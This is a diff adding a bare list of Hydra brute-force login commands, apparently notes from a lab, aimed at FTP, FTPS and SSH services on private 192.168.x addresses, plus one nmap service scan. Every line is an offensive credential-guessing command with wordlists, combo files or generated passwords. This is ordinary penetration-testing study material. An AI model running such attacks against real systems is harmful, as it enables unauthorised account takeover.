@@ -1,0 +1,21 @@
+hydra
+hydra -h
+hydra -l ftpuser -P passguess.txt 192.168.189.134 ftp
+hydra -L userguess.txt -p password123 192.168.189.134 ftp
+hydra -L userguess.txt -P passguess.txt 192.168.189.134 ftp
+hydra -L userguess.txt -P passguess.txt 192.168.189.134 ftp -V
+hydra -L userguess.txt -P passguess.txt 192.168.189.134 ftp -d
+hydra -L users.txt -P pass.txt 192.168.1.141 ftp -V -e nsr
+hydra -L users.txt -P pass.txt 192.168.1.141 ftp -o result.txt
+hydra -L users.txt -P pass.txt 192.168.1.141 ftp
+hydra -R
+hydra -l ftpuser -x 1:3:1 ftp://192.168.189.131
+hydra -L userguess.txt -P passguess.txt -M iplists.txt ftp
+cat userpass.txt
+hydra -C userpass.txt 192.168.189.134 ftp
+hydra -L userguess.txt -P passguess.txt 192.168.189.134 ftp -t 3 -V
+hydra http-get-form -U
+hydra -l ftpuser -P passguess.txt ftps://192.168.189.134
+nmap -sV 192.168.189.134
+hydra -l userguess.txt -P passguess.txt 192.168.189.134 ssh -s 22
+hydra -l ftpuser -x 2:3:1 ftp://192.168.189.134
